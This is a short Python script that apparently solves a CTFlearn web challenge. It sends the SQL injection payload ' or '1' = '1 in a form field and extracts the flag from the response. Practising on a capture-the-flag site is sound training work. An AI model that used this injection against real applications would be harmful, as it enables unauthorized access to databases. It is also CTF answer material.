#!/usr/bin/python3
import requests

r = requests.post('https://web.ctflearn.com/web4/', data={"submit":"Submit", "input":"' or '1' = '1"})

flag = r.text.split("fl4g__giv3r")[1]
flag = flag.split("<br>")[1]
print(flag)
